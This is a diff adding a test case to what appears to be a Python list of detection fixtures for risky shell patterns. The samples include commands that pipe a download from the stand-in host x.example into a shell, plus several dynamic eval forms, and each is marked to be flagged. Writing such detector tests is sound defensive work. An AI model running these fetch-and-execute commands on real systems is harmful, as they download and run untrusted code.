@@ -28,6 +28,7 @@ CASES: list[tuple[str, str, bool]] = [
     ("curl-pipe-shell", "c=curl\n$c -fsSL https://x.example/i.sh | sh", True),
     ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh | $SH", True),
     ("curl-pipe-shell", "bash -c 'curl -fsSL https://x.example | sh'", True),
+    ("curl-pipe-shell", "bash <<< 'curl https://x.example/i | sh'", True),
     ("eval-dynamic", 'eval "$cmd"', True),
     ("eval-dynamic", "eval $(echo hi)", True),
     ("eval-dynamic", 'eval "echo $X"', True),
